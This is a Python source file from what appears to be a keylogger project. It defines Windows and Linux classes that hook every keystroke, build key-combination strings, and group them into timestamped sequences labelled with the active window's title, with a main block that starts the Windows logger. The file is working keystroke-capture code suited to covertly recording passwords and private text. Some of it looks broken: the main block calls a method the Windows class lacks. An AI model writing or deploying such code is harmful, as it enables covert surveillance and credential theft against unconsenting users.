from datetime import datetime
import logging
import threading
import keyboard
from pynput import keyboard as kb
from typing import List, Protocol, Set, Tuple

from keylogger.data_wrapper import DataWrapper

logger = logging.getLogger(__name__)

SPECIAL = {
    kb.Key.shift,
    kb.Key.shift_l,
    kb.Key.shift_r,
    kb.Key.ctrl,
    kb.Key.ctrl_l,
    kb.Key.ctrl_r,
    kb.Key.alt,
    kb.Key.alt_l,
    kb.Key.alt_r,
    kb.Key.cmd,
    kb.Key.cmd_l,
    kb.Key.cmd_r,
}

SPECIAL_KEY_PRINT_CODE = {
    kb.Key.space: " ",
    kb.Key.backspace: "<-",
    kb.Key.ctrl: "^",
    kb.Key.ctrl_l: "^",
    kb.Key.ctrl_r: "^",
    kb.Key.enter: "\n",
}


class Listener(Protocol):
    buffer: List[str]  # buffer to store the data

    """
    Listner is a protocol that defines the interface for listening to data.

    it will may be implemented by classes that listen to data in different ways.
    such as:
        Listen to keyboard events
        Listen to mouse events
        Listen to file changes
    """

    def start(self) -> None:
        """
        start listening to data.
        """
        ...

    def stop(self) -> None:
        """
        stop listening to data.
        """
        ...

    def get_data(self) -> List[DataWrapper]:
        """
        get the data from the buffer.

        Also, clear the buffer after getting the data.
        """
        ...

    def start_new_sequence(self, active_window: str = ""):
        """
        Start a new sequence of data.

        This method should be called when the active window changes.
        """
        ...


class WindowsKeylogger:
    def __init__(self):
        self.buffer: List[str] = []

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        keyboard.hook(self._on_key_event)

    def stop(self) -> None:
        """
        stop listening to keyboard events.
        """
        keyboard.unhook_all()

    def get_data(self) -> DataWrapper:
        """
        get the data that has been collected and reset the buffer.
        """
        data = self.buffer.copy()
        self.buffer.clear()  # איפוס ה-buffer
        return DataWrapper(data)

    def _on_key_event(self, event):
        """
        internal method to handle key events.
        """
        self.buffer.append(event.name)


class LinuxKeylogger:
    def __init__(self):
        self.listener = kb.Listener(
            on_press=self._on_press, on_release=self._on_release
        )

        # Lock to prevent concurrent access to the buffer
        self._lock = threading.Lock()

        # The currently active modifiers
        self.current: Set[kb.Key | kb.KeyCode] = set()
        self.sequence: List[str] = []
        self.buffer: List[DataWrapper] = []
        self.active_window = ""
        self.sequence_start_time = None

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        self.listener.start()

    def stop(self) -> None:
        """
        stop listening to keyboard events.
        """
        if self.listener.is_alive():
            self.listener.stop()

    def get_data(self) -> List[DataWrapper]:
        """
        get the data that has been collected and reset the buffer.
        """
        self.start_new_sequence()
        with self._lock:
            data = self.buffer.copy()
            self.buffer.clear()
            logger.debug("Data collected: %s", [d.format_as_dict() for d in data])
            return data

    def start_new_sequence(self, active_window: str = ""):
        with self._lock:
            if self.sequence:
                self.buffer.append(
                    DataWrapper(
                        self.sequence,
                        end_time=datetime.now(),
                        start_time=self.sequence_start_time,
                        active_window=self.active_window,
                    )
                )
            self.active_window = active_window
            self.sequence = []
            self.sequence_start_time = None

    def _build_key_combo_printable(self, key: kb.Key | kb.KeyCode) -> str:
        storkes = []
        for k in {*self.current, key}:
            if isinstance(k, kb.KeyCode):
                storkes.append(str(k.char))
            else:
                storkes.append(SPECIAL_KEY_PRINT_CODE.get(k, f"<{k.name}>"))

        return "+".join(storkes)

    def _on_press(self, key: kb.Key | kb.KeyCode):
        with self._lock:
            if key in SPECIAL:
                self.current.add(key)

            if key not in SPECIAL:
                # save the sequence start time
                if not self.sequence_start_time:
                    self.sequence_start_time = datetime.now()

                key_comb = self._build_key_combo_printable(key)
                self.sequence.append(key_comb)
                print(key_comb, key)

    def _on_release(self, key):
        try:
            with self._lock:
                self.current.remove(key)
        except KeyError:
            pass


if __name__ == "__main__":
    from .active_window import WindowTracker

    keylogger = WindowsKeylogger()
    window_tracker = WindowTracker(lambda x: keylogger.start_new_sequence(x.title))

    keylogger.start()
    window_tracker.start()
